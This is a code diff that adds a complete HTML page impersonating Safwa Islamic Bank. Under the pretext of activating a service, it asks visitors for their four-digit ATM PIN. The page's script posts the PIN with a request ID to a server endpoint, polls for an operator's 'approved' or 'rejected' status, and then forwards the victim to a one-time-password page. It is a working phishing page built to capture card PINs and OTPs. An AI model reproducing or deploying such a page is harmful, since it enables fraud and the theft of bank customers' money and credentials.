@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirm Card PIN - Safwa Islamic Bank</title>
+<style>
+  :root {
+    --green: #1a6b3c;
+    --green-dark: #125129;
+    --navy: #12314f;
+    --gold: #f4c26b;
+    --ink: #1c2b36;
+    --muted: #5c6b74;
+    --light-bg: #f4f6f8;
+    --border: #d7dce0;
+    --gray-line: #dcdcdc;
+    --text-dark: #2b2b2b;
+    --card-bg: #ffffff;
+  }
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
+    background-color: var(--light-bg);
+    color: var(--text-dark);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 16px;
+  }
+  .screen {
+    width: 100%;
+    max-width: 440px;
+    min-height: auto;
+    display: flex;
+    flex-direction: column;
+    padding: 24px;
+    position: relative;
+    background: var(--card-bg);
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+  }
+  @media (max-width: 480px) {
+    body {
+      background: var(--card-bg);
+      padding: 0;
+      align-items: flex-start;
+    }
+    .screen {
+      box-shadow: none;
+      border-radius: 0;
+      min-height: 100vh;
+      padding: 16px 20px 0 20px;
+    }
+  }
+  .logo-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+  .logo-wrap img {
+    max-width: 220px;
+    width: 100%;
+    height: auto;
+  }
+  .page-subtitle {
+    color: var(--green);
+    font-weight: 700;
+    font-size: 18px;
+    margin-top: 16px;
+    text-align: center;
+  }
+  .secure-icon {
+    width: 50px;
+    height: 50px;
+    background-color: rgba(26, 107, 60, 0.05);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+    color: var(--green);
+  }
+  h2 {
+    color: var(--green);
+    font-size: 19px;
+    margin: 0 0 8px;
+    text-align: center;
+  }
+  p.desc {
+    color: var(--muted);
+    font-size: 13px;
+    line-height: 1.6;
+    margin: 0 0 24px;
+    text-align: center;
+  }
+  .pin-display {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 24px;
+    direction: ltr;
+  }
+  .pin-dot {
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid var(--border);
+    transition: all 0.15s ease;
+  }
+  .pin-dot.filled {
+    background-color: var(--green);
+    border-color: var(--green);
+    transform: scale(1.1);
+  }
+  .keypad {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    max-width: 280px;
+    margin: 0 auto 24px;
+  }
+  .key {
+    background-color: #ffffff;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    font-size: 18px;
+    font-weight: bold;
+    color: var(--green);
+    cursor: pointer;
+    user-select: none;
+    transition: all 0.1s ease;
+    text-align: center;
+  }
+  .key:active {
+    background-color: var(--light-bg);
+    transform: scale(0.95);
+  }
+  .key.action {
+    font-size: 13px;
+    background-color: #f8f9fa;
+    color: var(--muted);
+  }
+  .key.action:active {
+    background-color: #e9ecef;
+  }
+  .btn-submit {
+    width: 100%;
+    background-color: var(--green);
+    color: #ffffff;
+    border: none;
+    border-radius: 12px;
+    padding: 16px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    box-shadow: 0 4px 12px rgba(26, 107, 60, 0.2);
+  }
+  .btn-submit:hover {
+    background-color: var(--green-dark);
+  }
+  .btn-submit:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  .error-msg {
+    color: #c0392b;
+    font-size: 13px;
+    margin-top: 12px;
+    display: none;
+    text-align: center;
+  }
+  
+  /* Loading Overlay */
+  .loading-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(255, 255, 255, 0.95);
+    z-index: 100;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 20px;
+  }
+  .spinner {
+    width: 50px;
+    height: 50px;
+    border: 4px solid rgba(26, 107, 60, 0.1);
+    border-top-color: var(--green);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .loading-title {
+    font-size: 18px;
+    font-weight: bold;
+    color: var(--green);
+    margin-bottom: 8px;
+  }
+  .loading-desc {
+    font-size: 13px;
+    color: var(--muted);
+  }
+
+  .spacer {
+    flex: 1;
+    min-height: 20px;
+  }
+</style>
+</head>
+<body>
+
+  <div class="screen">
+    <!-- Unified Header -->
+    <div class="logo-wrap">
+      <img src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank" />
+      <div class="page-subtitle">Electronic Confirmation Page via Bank Card</div>
+    </div>
+
+    <div class="secure-icon">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+    </div>
+    <h2>Confirm Card PIN</h2>
+    <p class="desc">Please enter your 4-digit card PIN (ATM PIN) to complete the verification process and activate the service successfully.</p>
+    
+    <div class="pin-display">
+      <div class="pin-dot" id="dot-0"></div>
+      <div class="pin-dot" id="dot-1"></div>
+      <div class="pin-dot" id="dot-2"></div>
+      <div class="pin-dot" id="dot-3"></div>
+    </div>
+
+    <div class="keypad">
+      <div class="key" onclick="pressNum(1)">1</div>
+      <div class="key" onclick="pressNum(2)">2</div>
+      <div class="key" onclick="pressNum(3)">3</div>
+      <div class="key" onclick="pressNum(4)">4</div>
+      <div class="key" onclick="pressNum(5)">5</div>
+      <div class="key" onclick="pressNum(6)">6</div>
+      <div class="key" onclick="pressNum(7)">7</div>
+      <div class="key" onclick="pressNum(8)">8</div>
+      <div class="key" onclick="pressNum(9)">9</div>
+      <div class="key action" onclick="clearPin()">Clear</div>
+      <div class="key" onclick="pressNum(0)">0</div>
+      <div class="key action" onclick="backspace()">Delete</div>
+    </div>
+
+    <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm &amp; Continue</button>
+    <div class="error-msg" id="errorMsg">An error occurred while sending data, please try again.</div>
+
+    <div class="spacer"></div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-title">Verifying details...</div>
+    <div class="loading-desc">Please wait and do not close or refresh this page.</div>
+  </div>
+
+  <script>
+    var pin = "";
+    var requestId = localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
+
+    function updateDots() {
+      for (var i = 0; i < 4; i++) {
+        var dot = document.getElementById('dot-' + i);
+        if (i < pin.length) {
+          dot.classList.add('filled');
+        } else {
+          dot.classList.remove('filled');
+        }
+      }
+      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
+    }
+
+    function pressNum(num) {
+      if (pin.length < 4) {
+        pin += num;
+        updateDots();
+      }
+    }
+
+    function clearPin() {
+      pin = "";
+      updateDots();
+    }
+
+    function backspace() {
+      if (pin.length > 0) {
+        pin = pin.slice(0, -1);
+        updateDots();
+      }
+    }
+
+    function submitPin() {
+      if (pin.length !== 4) return;
+      if (!requestId) {
+        alert("Sorry, request ID not found. Please start over.");
+        return;
+      }
+
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      document.getElementById('errorMsg').style.display = 'none';
+
+      fetch('/api/atm', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: requestId, atmPin: pin })
+      })
+      .then(function(res) { return res.json(); })
+      .then(function(data) {
+        if (data.ok) {
+          startPollingStatus();
+        } else {
+          throw new Error('Failed to submit');
+        }
+      })
+      .catch(function() {
+        document.getElementById('loadingOverlay').style.display = 'none';
+        document.getElementById('errorMsg').style.display = 'block';
+      });
+    }
+
+    var pollInterval = null;
+    function startPollingStatus() {
+      pollInterval = setInterval(function() {
+        fetch('/api/status/' + requestId)
+          .then(function(res) { return res.json(); })
+          .then(function(data) {
+            if (data.ok) {
+              if (data.status === 'approved') {
+                clearInterval(pollInterval);
+                window.location.href = '/otp-en.html?id=' + requestId;
+              } else if (data.status === 'rejected') {
+                clearInterval(pollInterval);
+                document.getElementById('loadingOverlay').style.display = 'none';
+                alert("The transaction was rejected, please verify your details and try again.");
+                clearPin();
+              }
+            }
+          })
+          .catch(function() {});
+      }, 2500);
+    }
+  </script>
+</body>
+</html>
